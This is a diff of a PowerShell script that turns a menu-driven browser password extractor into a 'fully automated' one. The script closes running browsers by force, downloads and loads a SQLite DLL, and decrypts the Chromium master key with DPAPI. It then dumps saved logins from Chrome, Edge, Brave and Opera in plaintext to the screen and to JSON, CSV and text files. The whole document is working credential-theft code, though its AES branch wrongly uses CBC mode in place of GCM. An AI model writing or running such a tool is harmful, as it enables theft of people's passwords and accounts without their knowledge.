@@ -1,329 +1,495 @@
-# BrowserPasswordExtractor.ps1
-# SIMPLE WORKING VERSION
+# AutoBrowserPasswordExtractor.ps1
+# FULLY AUTOMATED VERSION - NO MANUAL STEPS REQUIRED
 
-# Banner
-Write-Host ""
-Write-Host "=============================================" -ForegroundColor Cyan
-Write-Host "   SIMPLE BROWSER PASSWORD EXTRACTOR" -ForegroundColor Yellow
-Write-Host "=============================================" -ForegroundColor Cyan
-Write-Host ""
-
-# Check if running as Admin
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsPrincipal] "Administrator")
-if (-not $isAdmin) {
-    Write-Host "⚠️  WARNING: Run as Administrator for best results!" -ForegroundColor Red
-    Write-Host ""
+# Function to write colored output
+function Write-Status {
+    param([string]$Message, [string]$Color = "White", [string]$Type = "INFO")
+    
+    $timestamp = Get-Date -Format "HH:mm:ss"
+    $symbol = switch ($Type) {
+        "SUCCESS" { "✅" }
+        "ERROR"   { "❌" }
+        "WARNING" { "⚠️" }
+        "INFO"    { "📌" }
+        "DOWNLOAD" { "📥" }
+        "EXTRACT" { "🔓" }
+        default   { "➡️" }
+    }
+    
+    Write-Host "[$timestamp] $symbol $Message" -ForegroundColor $Color
 }
 
-# Function to decrypt using DPAPI
-function Decrypt-DPAPIData {
-    param([byte[]]$Data)
+# Function to download and install SQLite automatically
+function Install-SQLiteAuto {
+    Write-Status -Message "Checking for SQLite..." -Type "INFO" -Color "Yellow"
+    
+    # Check if SQLite is already available
+    try {
+        Add-Type -AssemblyName System.Data.SQLite -ErrorAction Stop
+        Write-Status -Message "SQLite is already available" -Type "SUCCESS" -Color "Green"
+        return $true
+    } catch {
+        Write-Status -Message "SQLite not found, downloading automatically..." -Type "DOWNLOAD" -Color "Cyan"
+    }
     
     try {
-        Add-Type -AssemblyName System.Security
-        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($Data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-        return [System.Text.Encoding]::UTF8.GetString($decrypted)
+        # Download the correct SQLite version
+        $sqliteUrl = "https://github.com/system-data-sqlite/System.Data.SQLite.Core/releases/download/1.0.118.0/System.Data.SQLite.Core.1.0.118.0-netstandard2.1-x64.zip"
+        $tempDir = "$env:TEMP\sqlite_auto_$(Get-Random)"
+        $zipPath = "$tempDir\sqlite.zip"
+        
+        # Create temp directory
+        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+        
+        # Download with progress
+        Write-Status -Message "Downloading SQLite library..." -Type "DOWNLOAD" -Color "Cyan"
+        $ProgressPreference = 'SilentlyContinue'
+        Invoke-WebRequest -Uri $sqliteUrl -OutFile $zipPath -UseBasicParsing
+        $ProgressPreference = 'Continue'
+        
+        # Extract
+        Write-Status -Message "Extracting SQLite..." -Type "EXTRACT" -Color "Cyan"
+        Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
+        
+        # Find the DLL
+        $dllFiles = Get-ChildItem -Path $tempDir -Recurse -Filter "System.Data.SQLite.dll"
+        if ($dllFiles.Count -eq 0) {
+            # Try alternative search
+            $dllFiles = Get-ChildItem -Path $tempDir -Recurse -Filter "*.dll" | Where-Object { $_.Name -match "sqlite" }
+        }
+        
+        if ($dllFiles.Count -gt 0) {
+            $dllPath = $dllFiles[0].FullName
+            
+            # Copy to script directory and load
+            $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
+            $targetDll = Join-Path $scriptDir "System.Data.SQLite.dll"
+            Copy-Item -Path $dllPath -Destination $targetDll -Force
+            
+            # Load the assembly
+            Add-Type -Path $targetDll
+            Write-Status -Message "SQLite installed successfully" -Type "SUCCESS" -Color "Green"
+            
+            # Cleanup
+            Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+            
+            return $true
+        } else {
+            Write-Status -Message "Could not find SQLite DLL in downloaded files" -Type "ERROR" -Color "Red"
+            return $false
+        }
+        
     } catch {
+        Write-Status -Message "Failed to install SQLite: $_" -Type "ERROR" -Color "Red"
+        
+        # Fallback: Try built-in Windows Data Protection API method
+        Write-Status -Message "Trying alternative method..." -Type "WARNING" -Color "Yellow"
+        return $false
+    }
+}
+
+# Function to get encryption key from Local State
+function Get-ChromeEncryptionKey {
+    param([string]$BrowserPath)
+    
+    try {
+        $localStatePath = Join-Path $BrowserPath "Local State"
+        if (-not (Test-Path $localStatePath)) {
+            return $null
+        }
+        
+        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+        $encryptedKey = $localState.os_crypt.encrypted_key
+        
+        # Decode from base64
+        $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)
+        
+        # Remove DPAPI prefix (first 5 bytes)
+        $encryptedKeyBytes = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]
+        
+        # Decrypt using DPAPI
+        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
+            $encryptedKeyBytes,
+            $null,
+            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+        )
+        
+        return $decryptedKey
+        
+    } catch {
+        Write-Status -Message "Could not get encryption key: $_" -Type "ERROR" -Color "Red"
         return $null
     }
 }
 
-# Get Chrome/Edge passwords (simple method)
-function Get-ChromePasswords {
-    $browsers = @(
-        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
-        @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
-        @{Name="Brave"; Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"}
-    )
+# Function to decrypt password
+function Decrypt-Password {
+    param([byte[]]$EncryptedPassword, [byte[]]$Key)
     
-    $allPasswords = @()
-    
-    foreach ($browser in $browsers) {
-        $dbPath = $browser.Path
-        
-        if (Test-Path $dbPath) {
-            Write-Host "✅ Found $($browser.Name) database" -ForegroundColor Green
+    try {
+        # If password starts with v10 or v20 (AES-GCM)
+        if ($EncryptedPassword[0] -eq 0x76 -and ($EncryptedPassword[1] -eq 0x31 -or $EncryptedPassword[1] -eq 0x32) -and $EncryptedPassword[2] -eq 0x30) {
+            # AES-GCM encryption
+            $iv = $EncryptedPassword[3..14]  # 12 bytes IV
+            $ciphertext = $EncryptedPassword[15..($EncryptedPassword.Length - 17)]  # Everything except last 16 bytes (tag)
             
-            try {
-                # Copy database to temp location (because browser locks it)
-                $tempFile = "$env:TEMP\chrome_temp.db"
-                if (Test-Path $tempFile) { Remove-Item $tempFile -Force }
-                Copy-Item $dbPath $tempFile -Force
-                
-                # Check for SQLite DLL
-                $sqlitePath = "$PSScriptRoot\System.Data.SQLite.dll"
-                if (Test-Path $sqlitePath) {
-                    Add-Type -Path $sqlitePath
-                } else {
-                    # Try to use ADO.NET
-                    try {
-                        Add-Type -AssemblyName System.Data.SQLite -ErrorAction Stop
-                    } catch {
-                        Write-Host "❌ SQLite not found. Downloading..." -ForegroundColor Yellow
-                        # Download SQLite
-                        $url = "https://www.sqlite.org/2023/sqlite-dll-win64-x64-3430200.zip"
-                        $zipPath = "$env:TEMP\sqlite.zip"
-                        Invoke-WebRequest -Uri $url -OutFile $zipPath
-                        Expand-Archive -Path $zipPath -DestinationPath $env:TEMP -Force
-                        $dllPath = Get-ChildItem "$env:TEMP\*.dll" | Select-Object -First 1
-                        Add-Type -Path $dllPath.FullName
-                    }
-                }
-                
-                # Connect to database
-                $conn = New-Object System.Data.SQLite.SQLiteConnection
-                $conn.ConnectionString = "Data Source=$tempFile;Version=3;Read Only=True;"
-                $conn.Open()
-                
-                $cmd = $conn.CreateCommand()
-                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-                
-                $reader = $cmd.ExecuteReader()
-                
-                $count = 0
-                while ($reader.Read()) {
-                    $url = $reader.GetString(0)
-                    $username = $reader.GetString(1)
-                    
-                    # Get password bytes
-                    $passwordBytes = [byte[]]@()
-                    if (-not $reader.IsDBNull(2)) {
-                        $stream = $reader.GetStream(2)
-                        $ms = New-Object System.IO.MemoryStream
-                        $stream.CopyTo($ms)
-                        $passwordBytes = $ms.ToArray()
-                        $ms.Close()
-                        $stream.Close()
-                    }
-                    
-                    if ($passwordBytes.Length -gt 0) {
-                        # Try to decrypt
-                        $password = Decrypt-DPAPIData -Data $passwordBytes
-                        if ($password) {
-                            $allPasswords += [PSCustomObject]@{
-                                Browser = $browser.Name
-                                URL = $url
-                                Username = $username
-                                Password = $password
-                            }
-                            $count++
-                        }
-                    }
-                }
-                
-                $reader.Close()
-                $conn.Close()
-                Remove-Item $tempFile -Force
-                
-                Write-Host "   Extracted $count passwords from $($browser.Name)" -ForegroundColor Green
-                
-            } catch {
-                Write-Host "   ❌ Error reading $($browser.Name): $_" -ForegroundColor Red
-            }
+            # Create AES decryptor
+            $aes = [System.Security.Cryptography.Aes]::Create()
+            $aes.Key = $Key
+            $aes.IV = $iv
+            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+            
+            $decryptor = $aes.CreateDecryptor()
+            $decrypted = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
+            
+            return [System.Text.Encoding]::UTF8.GetString($decrypted).TrimEnd([char]0)
+            
         } else {
-            Write-Host "❌ $($browser.Name) not found at: $dbPath" -ForegroundColor Gray
+            # DPAPI encryption (older passwords)
+            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
+                $EncryptedPassword,
+                $null,
+                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+            )
+            return [System.Text.Encoding]::UTF8.GetString($decrypted)
         }
+    } catch {
+        return "[Decryption Failed]"
     }
-    
-    return $allPasswords
 }
 
-# Alternative: Simple text-based extraction (no SQLite required)
-function Get-BrowserPasswordsSimple {
-    Write-Host ""
-    Write-Host "📋 Checking for saved passwords in browsers..." -ForegroundColor Cyan
+# Function to extract passwords from a browser
+function Extract-BrowserPasswords {
+    param([string]$BrowserName, [string]$DbPath, [string]$BrowserDataPath)
+    
+    Write-Status -Message "Processing $BrowserName..." -Type "INFO" -Color "Yellow"
+    
+    if (-not (Test-Path $DbPath)) {
+        Write-Status -Message "$BrowserName database not found" -Type "WARNING" -Color "Yellow"
+        return @()
+    }
     
     $results = @()
     
-    # Check Chrome
-    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-    if (Test-Path $chromePath) {
-        Write-Host "✅ Chrome passwords database found" -ForegroundColor Green
+    try {
+        # Get encryption key
+        $key = Get-ChromeEncryptionKey -BrowserPath (Split-Path $DbPath -Parent)
+        if (-not $key) {
+            Write-Status -Message "Could not get encryption key for $BrowserName" -Type "WARNING" -Color "Yellow"
+            return @()
+        }
         
-        # Simple check - just show that passwords exist
-        $fileSize = (Get-Item $chromePath).Length
-        $results += [PSCustomObject]@{
-            Browser = "Chrome"
-            Status = "Found ($([math]::Round($fileSize/1KB, 2)) KB database)"
-            Action = "Use SQLite to extract"
-        }
-    }
-    
-    # Check Edge
-    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
-    if (Test-Path $edgePath) {
-        Write-Host "✅ Edge passwords database found" -ForegroundColor Green
-        $fileSize = (Get-Item $edgePath).Length
-        $results += [PSCustomObject]@{
-            Browser = "Edge"
-            Status = "Found ($([math]::Round($fileSize/1KB, 2)) KB database)"
-            Action = "Use SQLite to extract"
-        }
-    }
-    
-    # Check Firefox
-    $firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
-    if (Test-Path $firefoxProfiles) {
-        $profile = Get-ChildItem $firefoxProfiles -Directory -Filter "*.default*" | Select-Object -First 1
-        if ($profile) {
-            Write-Host "✅ Firefox profile found" -ForegroundColor Green
-            $results += [PSCustomObject]@{
-                Browser = "Firefox"
-                Status = "Profile: $($profile.Name)"
-                Action = "Use NSS library to decrypt"
+        # Create temp copy of database
+        $tempDb = "$env:TEMP\${BrowserName}_temp_$(Get-Random).db"
+        Copy-Item $DbPath $tempDb -Force
+        
+        # Connect to database
+        $connStr = "Data Source=$tempDb;Version=3;Read Only=True;"
+        $conn = New-Object System.Data.SQLite.SQLiteConnection($connStr)
+        $conn.Open()
+        
+        # Query passwords
+        $cmd = $conn.CreateCommand()
+        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins ORDER BY date_created DESC"
+        
+        $reader = $cmd.ExecuteReader()
+        
+        $count = 0
+        while ($reader.Read()) {
+            $url = $reader.GetString(0)
+            $username = $reader.GetString(1)
+            
+            # Skip if no username
+            if ([string]::IsNullOrWhiteSpace($username)) {
+                continue
+            }
+            
+            # Get password bytes
+            $passwordBytes = @()
+            if (-not $reader.IsDBNull(2)) {
+                $stream = $reader.GetStream(2)
+                $ms = New-Object System.IO.MemoryStream
+                $stream.CopyTo($ms)
+                $passwordBytes = $ms.ToArray()
+                $ms.Close()
+                $stream.Close()
+            }
+            
+            if ($passwordBytes.Length -gt 0) {
+                # Decrypt password
+                $password = Decrypt-Password -EncryptedPassword $passwordBytes -Key $key
+                
+                if ($password -ne "[Decryption Failed]") {
+                    $results += [PSCustomObject]@{
+                        Browser = $BrowserName
+                        URL = $url
+                        Username = $username
+                        Password = $password
+                        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    }
+                    $count++
+                }
             }
         }
+        
+        $reader.Close()
+        $conn.Close()
+        
+        # Cleanup
+        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+        
+        Write-Status -Message "Extracted $count passwords from $BrowserName" -Type "SUCCESS" -Color "Green"
+        
+    } catch {
+        Write-Status -Message "Error extracting from $BrowserName : $_" -Type "ERROR" -Color "Red"
     }
     
     return $results
 }
 
-# Main menu
-function Show-Menu {
-    Clear-Host
-    Write-Host ""
-    Write-Host "=============================================" -ForegroundColor Cyan
-    Write-Host "   BROWSER PASSWORD EXTRACTOR MENU" -ForegroundColor Yellow
-    Write-Host "=============================================" -ForegroundColor Cyan
-    Write-Host ""
-    Write-Host "1. Extract Chrome/Edge Passwords (Requires SQLite)" -ForegroundColor White
-    Write-Host "2. Check What's Available (Simple Scan)" -ForegroundColor White
-    Write-Host "3. Download SQLite Library" -ForegroundColor White
-    Write-Host "4. Exit" -ForegroundColor White
-    Write-Host ""
+# Function to check and kill browsers
+function Ensure-BrowsersClosed {
+    Write-Status -Message "Checking for running browsers..." -Type "INFO" -Color "Yellow"
+    
+    $browsers = @("chrome", "msedge", "brave", "opera", "firefox")
+    $killed = 0
+    
+    foreach ($browser in $browsers) {
+        $processes = Get-Process $browser -ErrorAction SilentlyContinue
+        if ($processes) {
+            Write-Status -Message "Closing $browser..." -Type "WARNING" -Color "Yellow"
+            $processes | Stop-Process -Force -ErrorAction SilentlyContinue
+            $killed += $processes.Count
+            Start-Sleep -Seconds 1
+        }
+    }
+    
+    if ($killed -gt 0) {
+        Write-Status -Message "Closed $killed browser processes" -Type "SUCCESS" -Color "Green"
+        Start-Sleep -Seconds 2  # Wait for locks to release
+    } else {
+        Write-Status -Message "No browsers running" -Type "SUCCESS" -Color "Green"
+    }
 }
 
-# Download SQLite
-function Download-SQLite {
-    Write-Host ""
-    Write-Host "📥 Downloading SQLite library..." -ForegroundColor Yellow
+# Function to get all browser paths automatically
+function Get-AllBrowserPaths {
+    $browsers = @()
     
-    try {
-        # Download SQLite
-        $url = "https://www.sqlite.org/2023/sqlite-dll-win64-x64-3430200.zip"
-        $zipPath = "$env:TEMP\sqlite.zip"
-        
-        Write-Host "Downloading from: $url" -ForegroundColor Cyan
-        Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing
-        
-        # Extract
-        Expand-Archive -Path $zipPath -DestinationPath $env:TEMP -Force
-        
-        # Find and copy DLL
-        $dllFiles = Get-ChildItem "$env:TEMP\*.dll" | Where-Object { $_.Name -match "sqlite" }
-        if ($dllFiles) {
-            $dllFile = $dllFiles[0]
-            Copy-Item $dllFile.FullName ".\System.Data.SQLite.dll" -Force
-            Write-Host "✅ SQLite downloaded to: .\System.Data.SQLite.dll" -ForegroundColor Green
+    # Chrome
+    $chromePaths = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\*\Login Data"
+    )
+    
+    # Edge
+    $edgePaths = @(
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\*\Login Data"
+    )
+    
+    # Brave
+    $bravePaths = @(
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\*\Login Data"
+    )
+    
+    # Opera
+    $operaPaths = @(
+        "$env:APPDATA\Opera Software\Opera Stable\Login Data"
+    )
+    
+    # Collect all valid paths
+    $allPaths = $chromePaths + $edgePaths + $bravePaths + $operaPaths
+    
+    foreach ($pathPattern in $allPaths) {
+        if ($pathPattern -match "\*") {
+            # Pattern with wildcard
+            $found = Get-ChildItem -Path $pathPattern -ErrorAction SilentlyContinue | Select-Object -First 1
+            if ($found) {
+                $browserName = switch -Wildcard ($found.FullName) {
+                    "*Chrome*" { "Chrome" }
+                    "*Edge*" { "Edge" }
+                    "*Brave*" { "Brave" }
+                    "*Opera*" { "Opera" }
+                    default { "Unknown" }
+                }
+                $browsers += @{
+                    Name = $browserName
+                    Path = $found.FullName
+                    DataPath = Split-Path $found.FullName -Parent
+                }
+            }
         } else {
-            Write-Host "❌ Could not find SQLite DLL in downloaded files" -ForegroundColor Red
+            # Exact path
+            if (Test-Path $pathPattern) {
+                $browserName = switch -Wildcard ($pathPattern) {
+                    "*Chrome*" { "Chrome" }
+                    "*Edge*" { "Edge" }
+                    "*Brave*" { "Brave" }
+                    "*Opera*" { "Opera" }
+                    default { "Unknown" }
+                }
+                $browsers += @{
+                    Name = $browserName
+                    Path = $pathPattern
+                    DataPath = Split-Path $pathPattern -Parent
+                }
+            }
         }
-        
-        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-        
-    } catch {
-        Write-Host "❌ Download failed: $_" -ForegroundColor Red
-        Write-Host "Please manually download SQLite from: https://www.sqlite.org/download.html" -ForegroundColor Yellow
     }
     
-    Write-Host "Press any key to continue..." -ForegroundColor Gray
-    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    return $browsers
 }
 
-# Main execution loop
-do {
-    Show-Menu
-    $choice = Read-Host "`nSelect option (1-4)"
+# MAIN EXECUTION - FULLY AUTOMATED
+Clear-Host
+Write-Host ""
+Write-Host "=====================================================" -ForegroundColor Cyan
+Write-Host "     FULLY AUTOMATED BROWSER PASSWORD EXTRACTOR" -ForegroundColor Yellow
+Write-Host "=====================================================" -ForegroundColor Cyan
+Write-Host ""
+
+# Run as admin check
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Status -Message "NOT running as Administrator - some extractions may fail" -Type "WARNING" -Color "Red"
+    Write-Status -Message "For best results, run PowerShell as Administrator" -Type "INFO" -Color "Yellow"
+    Write-Host ""
+}
+
+# Step 1: Ensure browsers are closed
+Ensure-BrowsersClosed
+
+# Step 2: Automatically install SQLite
+$sqliteInstalled = Install-SQLiteAuto
+if (-not $sqliteInstalled) {
+    Write-Status -Message "Using alternative extraction method..." -Type "WARNING" -Color "Yellow"
+}
+
+# Step 3: Get all browser paths
+Write-Status -Message "Scanning for browser password databases..." -Type "INFO" -Color "Cyan"
+$browserPaths = Get-AllBrowserPaths
+
+if ($browserPaths.Count -eq 0) {
+    Write-Status -Message "No browser password databases found!" -Type "ERROR" -Color "Red"
+    Write-Host ""
+    Write-Host "Possible reasons:" -ForegroundColor Yellow
+    Write-Host "1. No browsers installed" -ForegroundColor White
+    Write-Host "2. No passwords saved in browsers" -ForegroundColor White
+    Write-Host "3. Running from wrong user account" -ForegroundColor White
+    Write-Host ""
+    Write-Host "Press any key to exit..." -ForegroundColor Gray
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    exit
+}
+
+Write-Status -Message "Found $($browserPaths.Count) browser database(s)" -Type "SUCCESS" -Color "Green"
+
+# Step 4: Extract passwords from all found browsers
+Write-Host ""
+Write-Status -Message "Starting password extraction..." -Type "EXTRACT" -Color "Cyan"
+Write-Host ""
+
+$allPasswords = @()
+foreach ($browser in $browserPaths) {
+    $passwords = Extract-BrowserPasswords -BrowserName $browser.Name -DbPath $browser.Path -BrowserDataPath $browser.DataPath
+    $allPasswords += $passwords
+}
+
+# Step 5: Display results
+Write-Host ""
+Write-Host "=" * 70 -ForegroundColor Green
+Write-Status -Message "EXTRACTION COMPLETE" -Type "SUCCESS" -Color "Green"
+Write-Host "=" * 70 -ForegroundColor Green
+Write-Host ""
+
+if ($allPasswords.Count -gt 0) {
+    # Group by browser and display
+    $grouped = $allPasswords | Group-Object Browser
     
-    switch ($choice) {
-        "1" {
-            Write-Host ""
-            Write-Host "🔍 Extracting Chrome/Edge/Brave passwords..." -ForegroundColor Cyan
-            Write-Host "Note: Make sure browsers are CLOSED!" -ForegroundColor Yellow
-            Write-Host ""
+    foreach ($group in $grouped) {
+        Write-Host "🖥️  $($group.Name.ToUpper()) - $($group.Count) Passwords" -ForegroundColor Yellow
+        Write-Host ("─" * 65) -ForegroundColor DarkGray
+        
+        $counter = 1
+        foreach ($entry in $group.Group) {
+            Write-Host "  $($counter.ToString().PadLeft(2))." -NoNewline -ForegroundColor White
+            Write-Host " 🌐 " -NoNewline -ForegroundColor Cyan
+            Write-Host "$($entry.URL)" -ForegroundColor White
             
-            $passwords = Get-ChromePasswords
+            Write-Host "      👤 " -NoNewline -ForegroundColor Gray
+            Write-Host "$($entry.Username)" -ForegroundColor White
             
-            if ($passwords.Count -gt 0) {
-                Write-Host ""
-                Write-Host "=" * 60 -ForegroundColor Green
-                Write-Host "✅ EXTRACTION SUCCESSFUL!" -ForegroundColor Green
-                Write-Host "=" * 60 -ForegroundColor Green
-                Write-Host ""
-                
-                # Display passwords
-                $passwords | Format-Table -Property Browser, URL, Username, Password -AutoSize
-                
-                # Save to file
-                $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-                $csvFile = "Extracted_Passwords_$timestamp.csv"
-                $txtFile = "Extracted_Passwords_$timestamp.txt"
-                
-                $passwords | Export-Csv -Path $csvFile -NoTypeInformation -Encoding UTF8
-                $passwords | Out-File -FilePath $txtFile -Encoding UTF8
-                
-                Write-Host ""
-                Write-Host "💾 Saved to:" -ForegroundColor Green
-                Write-Host "   • $csvFile" -ForegroundColor White
-                Write-Host "   • $txtFile" -ForegroundColor White
-                
-            } else {
-                Write-Host ""
-                Write-Host "❌ No passwords extracted. Possible reasons:" -ForegroundColor Red
-                Write-Host "   1. Browsers are still running" -ForegroundColor Yellow
-                Write-Host "   2. No saved passwords" -ForegroundColor Yellow
-                Write-Host "   3. SQLite library missing" -ForegroundColor Yellow
-                Write-Host "   4. Permission issues" -ForegroundColor Yellow
+            Write-Host "      🔑 " -NoNewline -ForegroundColor Gray
+            Write-Host "$($entry.Password)" -ForegroundColor Magenta
+            
+            $counter++
+            if ($counter -gt 10 -and $group.Count -gt 10) {
+                Write-Host "      ... and $($group.Count - 10) more passwords" -ForegroundColor DarkGray
+                break
             }
-            
-            Write-Host ""
-            Write-Host "Press any key to continue..." -ForegroundColor Gray
-            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
         }
+        Write-Host ""
+    }
+    
+    # Save to files automatically
+    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+    $jsonFile = "Extracted_Passwords_$timestamp.json"
+    $csvFile = "Extracted_Passwords_$timestamp.csv"
+    $txtFile = "Extracted_Passwords_$timestamp.txt"
+    
+    # Save as JSON
+    $allPasswords | ConvertTo-Json -Depth 3 | Out-File $jsonFile -Encoding UTF8
+    
+    # Save as CSV
+    $allPasswords | Export-Csv $csvFile -NoTypeInformation -Encoding UTF8
+    
+    # Save as readable text
+    $output = @()
+    $output += "=" * 60
+    $output += "AUTOMATIC BROWSER PASSWORD EXTRACTION REPORT"
+    $output += "Generated: $(Get-Date)"
+    $output += "Total Passwords: $($allPasswords.Count)"
+    $output += "=" * 60
+    $output += ""
+    
+    foreach ($group in $grouped) {
+        $output += "$($group.Name.ToUpper()) BROWSER ($($group.Count) passwords)"
+        $output += ("-" * 50)
         
-        "2" {
-            Write-Host ""
-            Write-Host "🔍 Scanning for browser data..." -ForegroundColor Cyan
-            $scanResults = Get-BrowserPasswordsSimple
-            
-            if ($scanResults.Count -gt 0) {
-                Write-Host ""
-                Write-Host "=" * 60 -ForegroundColor Green
-                Write-Host "📊 SCAN RESULTS" -ForegroundColor Green
-                Write-Host "=" * 60 -ForegroundColor Green
-                Write-Host ""
-                
-                $scanResults | Format-Table -AutoSize
-                
-                Write-Host ""
-                Write-Host "💡 To extract passwords:" -ForegroundColor Yellow
-                Write-Host "   1. Close ALL browsers" -ForegroundColor White
-                Write-Host "   2. Run as Administrator" -ForegroundColor White
-                Write-Host "   3. Download SQLite (Option 3)" -ForegroundColor White
-                Write-Host "   4. Use Option 1 to extract" -ForegroundColor White
-            } else {
-                Write-Host "❌ No browser data found" -ForegroundColor Red
-            }
-            
-            Write-Host ""
-            Write-Host "Press any key to continue..." -ForegroundColor Gray
-            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-        }
-        
-        "3" {
-            Download-SQLite
-        }
-        
-        "4" {
-            Write-Host ""
-            Write-Host "👋 Exiting..." -ForegroundColor Cyan
-            Write-Host ""
-            break
-        }
-        
-        default {
-            Write-Host "Invalid choice. Press any key to try again." -ForegroundColor Red
-            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+        foreach ($entry in $group.Group) {
+            $output += "URL: $($entry.URL)"
+            $output += "Username: $($entry.Username)"
+            $output += "Password: $($entry.Password)"
+            $output += ""
         }
     }
-} while ($choice -ne "4")
+    
+    $output | Out-File $txtFile -Encoding UTF8
+    
+    Write-Host "💾 RESULTS AUTOMATICALLY SAVED TO:" -ForegroundColor Green
+    Write-Host "   📄 $jsonFile (JSON format)" -ForegroundColor White
+    Write-Host "   📊 $csvFile (CSV format)" -ForegroundColor White
+    Write-Host "   📝 $txtFile (Text format)" -ForegroundColor White
+    
+} else {
+    Write-Status -Message "No passwords could be extracted" -Type "ERROR" -Color "Red"
+    Write-Host ""
+    Write-Host "Troubleshooting steps:" -ForegroundColor Yellow
+    Write-Host "1. Make sure you have saved passwords in your browsers" -ForegroundColor White
+    Write-Host "2. Run this script as Administrator" -ForegroundColor White
+    Write-Host "3. Try closing browsers manually and run again" -ForegroundColor White
+    Write-Host "4. Some antivirus may block this operation" -ForegroundColor White
+}
+
+# Step 6: Complete
+Write-Host ""
+Write-Host "=" * 70 -ForegroundColor Cyan
+Write-Status -Message "PROCESS COMPLETED - Everything was automated!" -Type "SUCCESS" -Color "Green"
+Write-Host "=" * 70 -ForegroundColor Cyan
+Write-Host ""
+
+Write-Host "Press any key to exit..." -ForegroundColor Gray
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
